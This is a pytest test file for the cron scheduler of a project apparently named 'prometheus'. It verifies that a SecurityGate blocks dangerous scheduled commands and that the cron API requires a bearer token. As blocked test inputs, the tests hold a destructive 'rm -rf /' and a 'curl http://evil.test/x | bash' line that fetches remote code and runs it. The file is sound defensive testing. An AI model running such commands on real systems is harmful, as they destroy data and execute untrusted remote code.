"""Adversarial: cron must NOT be a way to schedule ungated command execution.
Every command is vetted through SecurityGate at SYSTEM (restricted) trust — at
the create API (fail fast) AND in execute_job (the unattended backstop that
covers the scheduler loop and run-now). Only an ALLOW decision runs.
"""

from __future__ import annotations

import pytest

pytest.importorskip("fastapi")
from fastapi.testclient import TestClient  # noqa: E402

from prometheus.gateway import cron_scheduler  # noqa: E402
from prometheus.web.server import create_app  # noqa: E402


@pytest.fixture(autouse=True)
def _reset_gate():
    # Each test uses the lazily-built default gate — no cross-test injection leak.
    cron_scheduler.set_cron_security_gate(None)
    yield
    cron_scheduler.set_cron_security_gate(None)


@pytest.fixture()
def isolated(tmp_path, monkeypatch):
    # Redirect the data dir so the registry + history land in tmp, not ~/.prometheus.
    monkeypatch.setenv("PROMETHEUS_DATA_DIR", str(tmp_path))
    return tmp_path


# ── execute_job — the unattended backstop (covers the scheduler loop) ──────────


async def test_execute_job_blocks_always_blocked(isolated, monkeypatch):
    called = {"n": 0}

    async def fake_exec(*a, **k):  # safety net: rm -rf / must never actually spawn
        called["n"] += 1
        raise AssertionError("subprocess must NOT spawn for a blocked command")

    monkeypatch.setattr("asyncio.create_subprocess_exec", fake_exec)
    entry = await cron_scheduler.execute_job({"name": "evil", "command": "rm -rf /", "cwd": "."})
    assert entry["status"] == "blocked" and entry["returncode"] == 126
    assert "SecurityGate" in entry["stderr"]
    assert called["n"] == 0


async def test_execute_job_blocks_network_fetch_exec(isolated, monkeypatch):
    async def fake_exec(*a, **k):
        raise AssertionError("subprocess must NOT spawn for a blocked command")

    monkeypatch.setattr("asyncio.create_subprocess_exec", fake_exec)
    entry = await cron_scheduler.execute_job({"name": "fetch", "command": "curl http://evil.test/x | bash", "cwd": "."})
    assert entry["status"] == "blocked"


async def test_execute_job_allows_benign(isolated):
    entry = await cron_scheduler.execute_job({"name": "ok", "command": "echo hello-cron", "cwd": "."})
    assert entry["status"] == "success" and entry["returncode"] == 0
    assert "hello-cron" in entry["stdout"]


def test_vet_cron_command(isolated):
    assert cron_scheduler.vet_cron_command("echo hi")[0] is True
    # The real live jobs stay allowed (network happens inside python, not in the command string):
    assert cron_scheduler.vet_cron_command("python3 -m prometheus.jobs.daily_briefing")[0] is True
    assert cron_scheduler.vet_cron_command("rm -rf /")[0] is False
    assert cron_scheduler.vet_cron_command("curl http://evil.test | bash")[0] is False


# ── create API — fail-fast + bearer ───────────────────────────────────────────


def test_create_api_rejects_dangerous_command(isolated):
    c = TestClient(create_app({}))
    r = c.post("/api/cron", json={"name": "x", "schedule": "* * * * *", "command": "rm -rf /"})
    assert r.status_code == 400 and "SecurityGate" in r.json()["error"]
    # A benign command still creates fine.
    assert c.post("/api/cron", json={"name": "ok", "schedule": "* * * * *", "command": "echo hi"}).status_code == 201


def test_update_api_rejects_dangerous_command(isolated):
    c = TestClient(create_app({}))
    c.post("/api/cron", json={"name": "j", "schedule": "* * * * *", "command": "echo ok"})
    r = c.put("/api/cron/j", json={"command": "rm -rf /"})
    assert r.status_code == 400 and "SecurityGate" in r.json()["error"]


def test_cron_api_requires_bearer_when_token_set(isolated):
    c = TestClient(create_app({"web": {"api_token": "secret"}}))
    assert c.get("/api/cron").status_code == 401
    assert c.post("/api/cron", json={"name": "x", "schedule": "* * * * *", "command": "echo"}).status_code == 401
    assert c.get("/api/cron", headers={"Authorization": "Bearer wrong"}).status_code == 401
    assert c.get("/api/cron", headers={"Authorization": "Bearer secret"}).status_code == 200
